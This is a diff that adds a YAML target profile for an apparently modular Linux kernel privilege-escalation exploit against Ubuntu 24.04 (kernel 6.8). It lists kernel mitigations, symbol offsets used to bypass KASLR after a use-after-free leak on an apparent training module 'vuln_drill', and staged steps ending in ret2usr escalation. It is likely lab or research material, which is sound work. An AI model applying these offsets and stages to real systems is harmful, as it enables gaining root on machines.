@@ -1,0 +1,39 @@
+name: ubuntu-24.04-x86_64
+kernel_version: "6.8"
+kernel_release: "6.8.0-106-generic"
+mitigations:
+  kpti: enabled
+  kaslr: enabled
+  smep: enabled
+  smap: enabled
+  cfi: enabled
+  cet: enabled
+  pac: disabled
+
+# Symbol offsets from _printk for KASLR bypass.
+# The exploit leaks _printk address via UAF+OOB read on vuln_drill,
+# then adds these offsets to compute target symbols.
+# These offsets are constant for a given kernel binary.
+# To regenerate: sudo grep -w 'SYMBOL' /proc/kallsyms on the target.
+symbol_offsets:
+  leak_symbol: _printk
+  commit_creds: -0x6fae0
+  prepare_kernel_cred: -0x6f560
+  init_task: 0x2458f70
+
+stages:
+  prep:
+    method: environment_checks
+  groom:
+    method: drill_alloc
+  trigger:
+    bug_type: uaf_oob
+  leak:
+    method: uaf_oob_read
+  primitive:
+    method: oob_write
+  escalate:
+    method: ret2usr
+  cleanup:
+    method: close_fds
+recommended_primitive: oob_write
